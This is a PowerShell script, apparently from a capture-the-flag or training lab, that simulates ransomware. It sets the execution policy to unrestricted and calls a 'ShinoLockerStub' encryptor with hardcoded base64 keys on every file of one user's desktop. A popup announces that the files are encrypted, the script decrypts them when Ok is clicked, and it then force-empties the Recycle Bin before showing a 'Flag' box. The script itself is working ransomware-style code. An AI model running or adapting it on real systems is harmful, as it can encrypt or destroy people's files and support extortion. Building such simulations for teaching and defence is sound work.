Set-ExecutionPolicy unrestricted -Scope CurrentUser
Add-Type -AssemblyName System.Windows.Forms

#$result = [System.Windows.MessageBox]::Show($popup_output)

$files = Get-ChildItem C:\Users\nrstewart\Desktop\*
foreach ($file in $files) 
{
    $thisstring = $file.Name
    C:\Users\nrstewart\Desktop\ShinoLockerStub E VEFLRVNISVRFU0hJR0FXQQ== UkFUQUtFU0hJVEVTSElHQQ== C:\Users\nrstewart\Desktop\$thisstring
    
}

#start shell:RecycleBinFolder
ii C:\Users\Default\Desktop
Start-Sleep -s 1
(New-Object -ComObject Shell.Application).Windows() | ForEach-Object {$_.quit()}



$msgBoxInput =  [System.Windows.Forms.MessageBox]::Show('Your files have been encrypted. Would you like to restore them.','Encryption Program','Ok','Error')

  switch  ($msgBoxInput) 
  {

    'Ok'{

            $files = Get-ChildItem C:\Users\nrstewart\Desktop\*
            foreach ($file in $files) 
            {
                $thisstring = $file.Name
                C:\Users\nrstewart\Desktop\ShinoLockerStub D VEFLRVNISVRFU0hJR0FXQQ== UkFUQUtFU0hJVEVTSElHQQ== C:\Users\nrstewart\Desktop\$thisstring
        
            } 

        }
  }

Clear-RecycleBin -Force

ii C:\Users\Default\Desktop
Start-Sleep -s 1
(New-Object -ComObject Shell.Application).Windows() | ForEach-Object {$_.quit()}

$flag = [System.Windows.Forms.MessageBox]::Show('Flag String','Flag','Ok','Error')